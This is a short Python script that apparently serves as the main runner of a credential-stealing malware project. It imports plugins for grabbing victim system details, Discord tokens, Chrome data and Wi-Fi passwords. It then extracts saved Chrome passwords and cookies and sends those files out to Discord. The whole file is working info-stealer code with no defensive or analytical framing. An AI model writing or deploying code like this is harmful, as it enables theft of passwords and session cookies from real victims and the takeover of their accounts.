from plugins.get_victim_information import get_computer_information
from plugins.get_discord_tokens import steal_discord_tokens
from plugins.get_chrome_information import *
from plugins.get_wifi_passwords import wifi_profiles_and_passwords

def run_plugins():
    extract_chrome_password()
    extract_chrome_cookie()
    
    send_file_to_discord(password_file_path, "Chrome Passwords")
    send_file_to_discord(cookies_file_path, "Chrome Cookies")
    

if __name__ == '__main__':
    run_plugins()